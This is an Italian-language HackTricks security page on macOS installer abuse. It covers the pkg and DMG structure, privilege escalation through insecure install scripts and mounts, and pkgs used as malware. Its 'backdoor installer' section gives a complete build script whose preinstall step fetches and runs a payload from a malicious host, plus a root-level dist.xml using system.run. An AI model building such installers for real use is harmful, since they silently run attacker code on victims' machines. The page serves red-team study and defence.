# macOS Installers Abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pkg Basic Information

Un **pacchetto di installazione** macOS (noto anche come file `.pkg`) è un formato di file utilizzato da macOS per **distribuire software**. Questi file sono come una **scatola che contiene tutto ciò di cui un software** ha bisogno per installarsi e funzionare correttamente.

Il file del pacchetto stesso è un archivio che contiene una **gerarchia di file e directory che verranno installati sul computer di destinazione**. Può anche includere **script** per eseguire operazioni prima e dopo l'installazione, come la configurazione di file di configurazione o la pulizia di versioni obsolete del software.

### Hierarchy

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Distribuzione (xml)**: Personalizzazioni (titolo, testo di benvenuto…) e controlli di script/installazione
* **PackageInfo (xml)**: Info, requisiti di installazione, posizione di installazione, percorsi degli script da eseguire
* **Bill of materials (bom)**: Elenco dei file da installare, aggiornare o rimuovere con permessi di file
* **Payload (archivio CPIO compresso gzip)**: File da installare nella `install-location` da PackageInfo
* **Scripts (archivio CPIO compresso gzip)**: Script di pre e post installazione e altre risorse estratte in una directory temporanea per l'esecuzione.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## DMG Basic Information

I file DMG, o Apple Disk Images, sono un formato di file utilizzato da macOS di Apple per le immagini disco. Un file DMG è essenzialmente un **immagine disco montabile** (contiene il proprio filesystem) che contiene dati di blocco grezzi tipicamente compressi e a volte crittografati. Quando apri un file DMG, macOS **lo monta come se fosse un disco fisico**, permettendoti di accedere ai suoi contenuti.

{% hint style="danger" %}
Nota che gli installer **`.dmg`** supportano **così tanti formati** che in passato alcuni di essi contenenti vulnerabilità sono stati abusati per ottenere **l'esecuzione di codice nel kernel**.
{% endhint %}

### Hierarchy

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

La gerarchia di un file DMG può essere diversa in base al contenuto. Tuttavia, per i DMG delle applicazioni, di solito segue questa struttura:

* Livello superiore: Questo è la radice dell'immagine disco. Contiene spesso l'applicazione e possibilmente un collegamento alla cartella Applicazioni.
* Applicazione (.app): Questa è l'applicazione reale. In macOS, un'applicazione è tipicamente un pacchetto che contiene molti file e cartelle individuali che compongono l'applicazione.
* Collegamento Applicazioni: Questo è un collegamento alla cartella Applicazioni in macOS. Lo scopo di questo è rendere facile per te installare l'applicazione. Puoi trascinare il file .app su questo collegamento per installare l'app.

## Privesc via pkg abuse

### Execution from public directories

Se uno script di pre o post installazione sta ad esempio eseguendo da **`/var/tmp/Installerutil`**, un attaccante potrebbe controllare quello script in modo da poter elevare i privilegi ogni volta che viene eseguito. O un altro esempio simile:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Questa è una [funzione pubblica](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) che diversi installer e aggiornamenti chiameranno per **eseguire qualcosa come root**. Questa funzione accetta il **percorso** del **file** da **eseguire** come parametro, tuttavia, se un attaccante potesse **modificare** questo file, sarebbe in grado di **abusare** della sua esecuzione con root per **elevare i privilegi**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Per ulteriori informazioni, controlla questo intervento: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Esecuzione tramite montaggio

Se un installer scrive in `/tmp/fixedname/bla/bla`, è possibile **creare un mount** su `/tmp/fixedname` senza proprietari in modo da poter **modificare qualsiasi file durante l'installazione** per abusare del processo di installazione.

Un esempio di questo è **CVE-2021-26089** che è riuscito a **sovrascrivere uno script periodico** per ottenere l'esecuzione come root. Per ulteriori informazioni, dai un'occhiata all'intervento: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg come malware

### Payload vuoto

È possibile generare semplicemente un file **`.pkg`** con **script di pre e post-installazione** senza alcun payload reale a parte il malware all'interno degli script.

### JS in xml di distribuzione

È possibile aggiungere tag **`<script>`** nel file **xml di distribuzione** del pacchetto e quel codice verrà eseguito e può **eseguire comandi** utilizzando **`system.run`**:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Installer con backdoor

Installer malevolo che utilizza uno script e codice JS all'interno di dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Riferimenti

* [**DEF CON 27 - Unpacking Pkgs Uno sguardo all'interno dei pacchetti di installazione di Macos e delle comuni vulnerabilità di sicurezza**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "Il mondo selvaggio degli installer di macOS" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Unpacking Pkgs Uno sguardo all'interno dei pacchetti di installazione di MacOS**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
